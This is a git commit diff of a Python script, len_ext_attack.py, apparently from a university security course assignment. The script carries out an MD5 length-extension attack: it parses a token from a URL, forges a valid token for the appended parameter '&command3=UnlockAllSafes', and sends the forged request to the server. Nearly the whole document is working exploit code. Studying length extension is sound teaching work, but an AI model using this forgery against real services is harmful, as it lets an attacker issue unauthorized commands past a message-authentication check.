f2885cf850572fdac0f9e0746f48dcec74c8a58b
ryanmars <ryanmars@umich.edu>
2018-01-16 17:36:14 -0500

    :'(

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -1,42 +1,36 @@
 from  pymd5 import md5, padding
 import httplib, urlparse, urllib, sys
 
-url = urllib.quote(sys.argv[1])
+url = sys.argv[1]
 
+idx1 = url.find("token=")
+idx2 = url.find("user=")
 
-
-idx1 = url.find("token%3D")
-idx2 = url.find("%26user%3D")
-
-
-url1 = url[:idx1+8]
-token = url[idx1+8:idx2]
+url1 = url[:idx1+6]
+token = url[idx1+6:idx2-1]
 url2 = url[idx2:len(url)]
 
+print "URL=", url
+print "\nURL1=", url1
+print "TOKEN=", token
+print "URL2=", url2
+
 x = "&command3=UnlockAllSafes"
-url2 = url2 + x
 
 l_of_m = 8 + len(url2)
 bits = (l_of_m + len(padding(l_of_m*8)))*8
 
+h = md5(state=(token.decode("hex")), count=bits)
 
-h = md5(state=(token).decode("hex"), count=bits)
-
-x += urllib.quote(padding((l_of_m + len(x)) * 8))
-
-
-
-
-h.update(x)
+h.update(urllib.quote(padding((l_of_m + len(x)) * 8) + x))
 
 new_token = h.hexdigest()
 
+new_url = url1 + new_token + "&" + url2 + x
 
-new_url = url1 + new_token + url2
-#print urllib.unquote(url)
-#print urllib.unquote(new_url)
+print "\nNEW=", new_url
 
-parsedUrl = urlparse.urlparse(urllib.unquote(new_url))
+parsedUrl = urlparse.urlparse(new_url)
 conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
 print conn.getresponse().read()
